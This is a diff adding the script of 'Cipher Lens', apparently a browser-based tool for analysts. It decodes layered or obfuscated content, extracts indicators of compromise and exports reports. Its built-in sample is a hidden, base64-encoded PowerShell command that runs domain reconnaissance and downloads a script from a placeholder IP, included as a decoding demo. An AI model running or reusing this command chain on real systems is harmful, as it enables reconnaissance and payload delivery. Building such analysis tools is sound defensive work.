+  if(r==null||r===''){if(!quiet)toast(d.name+': nothing to decode here');return false}
+  const t=typeof r=='string'?r:r.t,n=typeof r=='string'?d.name:r.n;
+  if(t===s||stack.includes(t)){if(!quiet)toast('No change after '+d.name);return false}
+  stack.push(t);names.push(n);return true}
+async function auto(){
+  let n=0,any=false;
+  while(n++<12){const c=detect(cur())[0];if(!c||c.sc<.7||!await step(c.d,true))break;any=true}
+  render();if(any)record();else toast('No encoding detected. Try a manual decoder below the input.')}
+function record(){
+  const top=cur();if(hist[0]&&hist[0].stack.at(-1)===top)return;
+  hist.unshift({time:new Date().toLocaleTimeString(),names:[...names],stack:[...stack]});hist.length=Math.min(hist.length,30);renderHist()}
+function renderHist(){
+  $('#hist').innerHTML=hist.length?hist.map((h,i)=>`<button data-h="${i}">${h.time} | ${esc(h.names.join(' > '))} | ${esc(h.stack.at(-1).slice(0,70).replace(/\s+/g,' '))}</button>`).join(''):'<span class="mut">Decoded results appear here so you can jump back to them.</span>'}
+function render(){
+  const t=cur(),a=analyze(t),det=detect(t),dm=new Map(det.map(x=>[x.d.id,x.sc]));
+  $('#out').innerHTML=a.html||'<span class="mut">// output appears here</span>';
+  $('#ocnt').textContent=`${t.length} chars | layer ${stack.length-1}`;
+  $('#cnt').textContent=stack[0].length+' chars';
+  $('#chain').innerHTML=names.map((n,i)=>`<button class="${i==stack.length-1?'on':''}" data-i="${i}">${esc(n)}</button>`).join('<span>&rsaquo;</span>');
+  $('#ops').innerHTML=D.map(d=>{const s=dm.get(d.id)||0;return`<button class="op ${s>=.7?'hit':s>0?'maybe':''}" data-id="${d.id}">${esc(d.name)}${s?`<i>${Math.round(s*100)}%</i>`:''}</button>`}).join('');
+  const ks=Object.keys(a.F),sus=ks.filter(k=>k[0]=='S'),lv=sus.some(k=>/Credential/.test(k))||sus.length>=3?'HIGH':sus.length?'MEDIUM':'';
+  const rk=$('#risk');rk.textContent=lv?'Triage hint: '+lv+' (heuristic, verify in EDR)':'';rk.style.color=lv=='HIGH'?'var(--bad)':'var(--warn)';
+  $('#iocs').innerHTML=ks.length?ks.sort((x,y)=>(y[0]=='S')-(x[0]=='S')).map(k=>`<div><h3 class="${a.F[k].c}">${esc(k)} <small>${a.F[k].v.size}</small></h3><div>${[...a.F[k].v].map(v=>`<code data-c="${esc(v)}">${esc(v.slice(0,160))}</code>`).join('')}</div></div>`).join(''):'<span class="mut">Nothing suspicious found in this layer yet. Decode further or paste more content.</span>'}
+function reset(v){stack=[v];names=['Input'];render()}
+function setInput(v){$('#inp').value=v;reset(v)}
+function sample(){
+  const u16=s=>{const b=new Uint8Array(s.length*2);for(let i=0;i<s.length;i++){b[2*i]=s.charCodeAt(i)&255;b[2*i+1]=s.charCodeAt(i)>>8}return b};
+  const inner=btoa('whoami /all & net user /domain & nltest /dom_trusts & curl http://198.51.100.7/a.ps1 -o C:\\Users\\Public\\a.ps1');
+  const ps="IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"+inner+"')))";
+  return 'powershell.exe -nop -w hidden -enc '+btoa(String.fromCharCode(...u16(ps)))}
+
+let mode='dec';
+async function encode(){
+  const s=cur();if(!s){toast('Enter text to encode first');return}
+  const e=E.find(x=>x.id==$('#encSel').value);let r;
+  try{r=await e.run(s)}catch(x){toast(e.name+' failed: '+x.message);return}
+  stack.push(r);names.push(e.name);render();record()}
+const go=()=>mode=='enc'?encode():auto();
+function setMode(m){
+  mode=m;const e=m=='enc';
+  $('#mDec').classList.toggle('on',!e);$('#mEnc').classList.toggle('on',e);
+  $('#mDec').setAttribute('aria-pressed',String(!e));$('#mEnc').setAttribute('aria-pressed',String(e));
+  $('#bAuto').textContent=e?'Encode':'Decode';$('#encWrap').hidden=!e;$('#ops').hidden=e;
+  $('#inp').placeholder=e?'// type plain text, pick an encoding, press Encode. Encode again to add a layer':'// paste encoded or obfuscated content. Ctrl+Enter to decode'}
+$('#encSel').innerHTML=E.map(e=>`<option value="${e.id}">${esc(e.name)}</option>`).join('');
+$('#mDec').onclick=()=>setMode('dec');$('#mEnc').onclick=()=>setMode('enc');
+$('#inp').addEventListener('input',e=>{clearTimeout(timer);timer=setTimeout(()=>reset(e.target.value),150)});
+$('#inp').addEventListener('keydown',e=>{if(e.ctrlKey&&e.key=='Enter'){e.preventDefault();reset($('#inp').value);go()}});
+$('#bAuto').onclick=()=>{if($('#inp').value!==stack[0])reset($('#inp').value);go()};
+function md(){const F=analyze(cur()).F,ks=Object.keys(F),f='```';
+  return '# Cipher Lens report\n\n**Layers:** '+names.join(' > ')+'\n\n**Original input:**\n'+f+'\n'+stack[0]+'\n'+f+'\n\n**Final output:**\n'+f+'\n'+cur()+'\n'+f+'\n\n**Indicators:**\n'+(ks.length?ks.map(k=>'- '+k+': '+[...F[k].v].map(v=>'`'+(k[0]!='S'&&dfk(k)?defang(v):v)+'`').join(', ')).join('\n'):'- none')}
+$('#bMd').onclick=()=>copy(md());
+$('#bWrap').onclick=()=>{const o=$('#out').classList.toggle('nowrap');$('#bWrap').textContent='[wrap: '+(o?'off':'on')+']'};
+async function loadFile(f){if(!f)return;if(f.size>5e6){toast('File is over 5 MB');return}
+  const b=new Uint8Array(await f.arrayBuffer()),t=b2t(b);setInput(printable(t)>.9?t:h2(b));toast('Loaded '+f.name)}
+$('#bFile').onclick=()=>$('#file').click();
+$('#file').onchange=e=>{loadFile(e.target.files[0]);e.target.value=''};
+$('#inp').addEventListener('dragover',e=>e.preventDefault());
+$('#inp').addEventListener('drop',e=>{if(e.dataTransfer.files.length){e.preventDefault();loadFile(e.dataTransfer.files[0])}});
+$('#bSwap').onclick=()=>{if(stack.length<2){toast('Nothing to move yet. Run a decode or encode first.');return}setInput(cur())};
+$('#bUndo').onclick=()=>{if(stack.length>1){stack.pop();names.pop();render()}};
+const clearAll=()=>{setInput('');$('#inp').focus()};
+$('#bClear').onclick=clearAll;$('#bReset').onclick=clearAll;
+$('#bSample').onclick=()=>{if(mode=='enc'){setInput('whoami /all & net user /domain');return}setInput(sample());auto()};
+$('#bCopy').onclick=()=>copy(cur());
+$('#bHC').onclick=()=>{hist=[];renderHist()};
+$('#bTheme').onclick=()=>{const h=document.documentElement,l=h.dataset.theme=='dark';h.dataset.theme=l?'light':'dark';$('#bTheme').textContent=l?'Dark mode':'Light mode'};
+$('#bIoc').onclick=()=>{const a=analyze(cur()).F,l=[];
+  for(const k in a)if(k[0]!='S')for(const v of a[k].v)l.push(dfk(k)?defang(v):v);
+  l.length?copy([...new Set(l)].join('\n')):toast('No IOCs in this layer')};
+$('#bJson').onclick=()=>{
+  const F=analyze(cur()).F,iocs={};for(const k in F)iocs[k]=[...F[k].v];
+  const blob=new Blob([JSON.stringify({tool:'Cipher Lens',generated:new Date().toISOString(),layers:names.map((n,i)=>({step:n,output:stack[i]})),indicators:iocs},null,2)],{type:'application/json'});
+  const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cipher-lens-'+Date.now()+'.json';a.click();setTimeout(()=>URL.revokeObjectURL(a.href),1e3)};
+$('#ops').addEventListener('click',async e=>{const b=e.target.closest('[data-id]');if(!b)return;
+  if(await step(D.find(d=>d.id==b.dataset.id))){render();record()}});
+$('#chain').addEventListener('click',e=>{const b=e.target.closest('[data-i]');if(!b)return;const i=+b.dataset.i;stack.length=i+1;names.length=i+1;render()});
+$('#iocs').addEventListener('click',e=>{const c=e.target.closest('[data-c]');if(c)copy(c.dataset.c)});
+$('#hist').addEventListener('click',e=>{const b=e.target.closest('[data-h]');if(!b)return;const h=hist[+b.dataset.h];
+  stack=[...h.stack];names=[...h.names];$('#inp').value=stack[0];render()});
+render();renderHist();
+</script>
+</body>
+</html>
